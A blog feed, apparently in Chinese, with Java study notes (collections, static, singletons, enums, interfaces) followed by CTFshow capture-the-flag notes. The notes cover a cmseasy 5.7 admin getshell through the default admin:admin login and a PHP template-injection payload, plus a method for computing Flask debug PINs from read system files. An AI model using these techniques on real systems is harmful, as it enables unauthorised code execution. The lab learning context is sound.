ArrayList()list.add(ele)&#x2F;&#x2F;向列表中添加元素（无类型限制）list.add(index,ele)&#x2F;&#x2F;向列表指定位置插入元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ArrayList支持泛型，可通过<code>ArrayList&lt;数据类型&gt;</code>来限定列表中的数据类型</p><p>一些API</p><pre class="line-numbers language-none"><code class="language-none">list.get(index)&#x2F;&#x2F;获取指定位置元素list.size()&#x2F;&#x2F;获取列表元素个数list.remove(index)&#x2F;&#x2F;删除指定位置的元素list.set(index,ele)&#x2F;&#x2F;修改指定位置的元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="面向对象咯"   >          <a href="#面向对象咯" class="heading-link"><i class="fas fa-link"></i></a><a href="#面向对象咯" class="headerlink" title="面向对象咯"></a>面向对象咯</h3>      <p><strong>static关键字</strong></p><ul><li>static是静态的意思，可以用来修饰成员变量和成员方法</li><li>static修饰成员变量表示该成员变量值在内存中储存一份，可以被共享访问修改</li><li>静态成员变量常用来表示需要被共享的信息，可以被共享访问</li><li>静态成员变量和方法访问时可通过<code>类名.成员</code>也可通过<code>对象名.成员</code>访问，建议通过类访问</li><li>在同一个类中，访问静态方法，类名可以省略不写</li><li>注意调用静态成员方法（包括通过对象调用），方法中不能调用非静态成员变量哦（如下图）</li><li><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207050029328.png"></li><li>静态方法中不可以出现this关键字</li></ul><p><strong>静态方法应用</strong></p><ul><li>可用于构造工具类，由于不需要进行实例化，可将类的构造函数设置成私有权限</li></ul><p><strong>代码块</strong></p><p>定义：花括号括起来的都是代码块</p><ul><li>static代码块（static{}）：<ul><li>属于类，与类一起优先加载（比main还快）一次，自动触发执行</li><li>作用：可以用于初始化静态资源，一边后续使用</li></ul></li><li>实例代码块（{}）：<ul><li>属于对象，每次构建对象时，都会出发一次执行</li><li>作用：初始化实例资源</li></ul></li></ul><p><strong>设计模式</strong>：在开发中经常遇到的问题的最优解</p><p><strong>单例模式</strong></p><p>一个类只能创建一个对象</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//饿汉单例，在类加载时直接创造对象</span><span class="token keyword">public</span> <span class="token keyword">class</span> danli <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> danli dddd<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"单例被创建"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//懒汉单例，在类实例首次被调用时创造对象</span><span class="token keyword">public</span> <span class="token keyword">class</span> danli <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> danli dddd<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"单例被创建"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> danli <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dddd<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            dddd<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> dddd<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>继承</strong></p><ul><li><p>```<br>public class Son extends Father {}</p><pre class="line-numbers language-none"><code class="language-none">- super关键字  - &#96;super&#96;可以用来引用直接父类的实例变量。  - &#96;super&#96;可以用来调用直接父类方法。  - &#96;super()&#96;可以用于调用直接父类构造函数。- 构造方法：默认先执行父类无参构造，再执行自己构造**包**- 包是用来分别管理各种不同的类的，类似文件夹，建包有利于程序的管理和维护- 包名语法格式：域名倒写.技术名称- 建包语句必须在第一行- 相同包下的类可直接访问，不同包下类必须导包，&#96;import 包名.类名&#96;- 如果该类中使用不同包下相同的类名，此时默认只能导入一个类的包，另一个类的要使用全名访问**权限修饰符**- 私有：&#96;private&#96;  - 只能在本类中访问- 缺省：啥都不加  - 只能本类，本包下访问- 保护：&#96;protected&#96;  - 本类，同包的其他类中，其他包的子类中- 公共：&#96;public&#96;  - 谁都能访问**final关键字**- 修饰类：表明最终类，不可被继承- 修饰方法：表明最终方法，不可被重写- 修饰变量：表明变量经过首次赋值后，不能再次被赋值- 常量定义：&#96;public static final&#96;**枚举**- 作用：为了做信息的标志和信息的分类- &#96;&#96;&#96;java  修饰符 enum 枚举名称&#123;  第一行都是罗列枚举类实例的名称  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>枚举都继承自枚举类型：<code>java.lang.Enum</code></p></li><li><p>枚举类都是最终类</p></li><li><p>构造器的构造器都是私有的，枚举对外不能创建对象</p></li><li><p>枚举类的第一行默认都是罗列枚举对象的名称的</p></li><li><p>枚举类相当于是多例模式</p></li><li><p>```java<br>//枚举类的作用实例代码<br>//例如开发游戏接受用户输入的四个方向的信号<br>//如果选择常量，具有可读性但是入参值不受约束<br>//Orientation.java<br>public enum Orientation {</p><pre><code>UP,DOWN,LEFT,RIGHT</code></pre><p>}<br>//zhu.java<br>public class zhu {</p><pre><code>public static void move(Orientation o)&#123;    switch (o)&#123;        case UP -&gt; System.out.println(&quot;往上走&quot;);        case DOWN -&gt;System.out.println(&quot;往下走&quot;);        case LEFT -&gt; System.out.println(&quot;往左走&quot;);        case RIGHT -&gt; System.out.println(&quot;往右走&quot;);    &#125;&#125;public static void main(String[] args) &#123;    move(Orientation.RIGHT);&#125;</code></pre><p>}</p><pre class="line-numbers language-none"><code class="language-none">- ![](https:&#x2F;&#x2F;jlan-blog.oss-cn-beijing.aliyuncs.com&#x2F;202207061509169.png)**抽象**- abstract修饰的类就是抽象类，修饰的方法就是抽象方法- 写抽象方法时不能写方法体- 如果一个类中的方法被声明成为抽象方法，那么这个类必须被声明为抽象类- &#96;&#96;&#96;java  public abstract class animal &#123;      public abstract void run();  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>抽象类可以理解为不完整的设计图，一般做父类</p></li><li><p>当父类知道子类需要完成某些行为，而各个子类实现方法又不同，就把该类定义为抽象方法</p></li></ul><p><strong>接口</strong></p><ul><li><p>```java<br>//接口定义<br>public interface 接口名{</p><pre><code>    //常量    //抽象方法</code></pre><p>}</p><pre class="line-numbers language-none"><code class="language-none">- &#96;&#96;&#96;java  &#x2F;&#x2F;接口实现  class 类名 implements 接口1,接口2...&#123;  &#x2F;&#x2F;抽象方法重写  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>接口可以多继承，一个接口可以继承多个接口</p></li><li><p>接口不能创建对象</p></li><li><p>一个类实现多个接口，多个接口中有同样的静态方法不冲突</p></li><li><p>一个类继承了父类又实现了接口，父类和接口中的同名方法，默认使用父类的</p></li><li><p>一个类实现了多个接口，多个接口中存在同名的默认方法，不冲突，这个类重写该方法即可</p></li><li><p>一个接口继承多个接口是没有问题的，如果多个接口中存在规范冲突则不能继承</p></li><li><p>JDK8开始对接口做的新增方法</p><ul><li>接口中可以有带方法实现的方法</li><li>默认方法：类似之前的普通方法，使用defalut修饰，默认用public修饰。需要用接口实现类的对象来调用</li><li>静态方法：使用static修饰，接口静态方法必须用本身的接口名来调用</li><li>私有方法：使用private修饰，只能在本类（本接口）中被其他的默认方法或者私有方法访问</li></ul></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowCMS</title>
      <link href="/posts/478f3262.html"/>
      <url>/posts/478f3262.html</url>
      
        <content type="html"><![CDATA[<p><strong>477</strong></p><p>cmseasy 5.7，百度搜搜漏洞，有后台getshell</p><p>首先/admin登录后台，admin:admin直接登录，在模版—自定义标签中写入payload</p><pre class="line-numbers language-none"><code class="language-none">1111111111111&quot;;&#125;&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>环境变量里面找吧</p><p><strong>478</strong></p><p>phpcms 9.6.0</p><p><strong>479</strong></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow常用姿势</title>
      <link href="/posts/eaf7f5df.html"/>
      <url>/posts/eaf7f5df.html</url>
      
        <content type="html"><![CDATA[<p><strong>801</strong></p>        <h3 id="flask计算PIN"   >          <a href="#flask计算PIN" class="heading-link"><i class="fas fa-link"></i></a><a href="#flask计算PIN" class="headerlink" title="flask计算PIN"></a>flask计算PIN</h3>      <p><strong>什么是PIN码</strong></p><p>PIN码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式</p><p><strong>注意事项：谨记！！python 3.8（md5）和3.6（sha1）pin码生成方式不同</strong></p><p><strong>使用条件：flask debug模式开启 存在任意文件读取</strong></p><p>首先是python PIN码的生成脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#生效时间为一周</span>PIN_TIME <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token keyword">def</span> <span class="token function">hash_pin</span><span class="token punctuation">(</span>pin<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pin<span class="token punctuation">&#125;</span></span><span class="token string"> added salt"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> <span class="token string">"replace"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>_machine_id<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token comment">#获取机器号</span><span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> _machine_id    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _machine_id    <span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        linux <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> value<span class="token punctuation">:</span>            <span class="token comment">#读取文件进行拼接</span>                linux <span class="token operator">+=</span> value                <span class="token keyword">break</span>        <span class="token comment"># Containers share the same machine id, add some cgroup</span>        <span class="token comment"># information. This is used outside containers too but should be</span>        <span class="token comment"># relatively stable across boots.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token comment">#继续进行拼接，这里处理一下只要/docker后的东西</span>                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>            <span class="token keyword">return</span> linux        <span class="token comment"># On OS X, use ioreg to get the computer's serial number.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># subprocess may not be available, e.g. Google App Engine</span>            <span class="token comment"># https://github.com/pallets/werkzeug/issues/925</span>            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span>                <span class="token punctuation">[</span><span class="token string">"ioreg"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"IOPlatformExpertDevice"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE            <span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token comment"># On Windows, use winreg to get the machine guid.</span>        <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">"win32"</span><span class="token punctuation">:</span>            <span class="token keyword">import</span> winreg            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> winreg<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>                    winreg<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>                    <span class="token string">"SOFTWARE\\Microsoft\\Cryptography"</span><span class="token punctuation">,</span>                    <span class="token number">0</span><span class="token punctuation">,</span>                    winreg<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> winreg<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">,</span>                <span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>                    guid<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span>                    guid_type<span class="token punctuation">:</span> <span class="token builtin">int</span>                    guid<span class="token punctuation">,</span> guid_type <span class="token operator">=</span> winreg<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">"MachineGuid"</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> guid_type <span class="token operator">==</span> winreg<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">:</span>                        <span class="token keyword">return</span> guid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> guid            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">pass</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    _machine_id <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> _machine_id<span class="token keyword">class</span> <span class="token class-name">_ConsoleFrame</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Helper class so that we can reuse the frame console code for the    standalone console.    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> namespace<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Any<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>console <span class="token operator">=</span> Console<span class="token punctuation">(</span>namespace<span class="token punctuation">)</span>        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin    code and a random key.  The hope is that this is stable between    restarts to not make debugging particularly frustrating.  If the pin    was forcefully disabled this returns `None`.    Second item in the resulting tuple is the cookie name for remembering.    """</span>    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>    rv <span class="token operator">=</span> <span class="token boolean">None</span>    num <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was explicitly disabled</span>    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was provided explicitly</span>    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># If there are separators in the pin, return it directly</span>        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>            rv <span class="token operator">=</span> pin        <span class="token keyword">else</span><span class="token punctuation">:</span>            num <span class="token operator">=</span> pin    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>        <span class="token comment"># have a username, such as in Docker.</span>        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token boolean">None</span>    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>    <span class="token comment"># This information only exists to make the cookie unique on the</span>    <span class="token comment"># computer, not as a security feature.</span>    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        username<span class="token punctuation">,</span>        modname<span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token comment"># This information is here to make it harder for an attacker to</span>    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>    <span class="token comment"># within the unauthenticated debug page.</span>    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>    <span class="token comment"># end up with the same value and generate out 9 digits</span>    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>    <span class="token comment"># we don't have a result yet.</span>    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> num    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name<span aria-hidden="true" 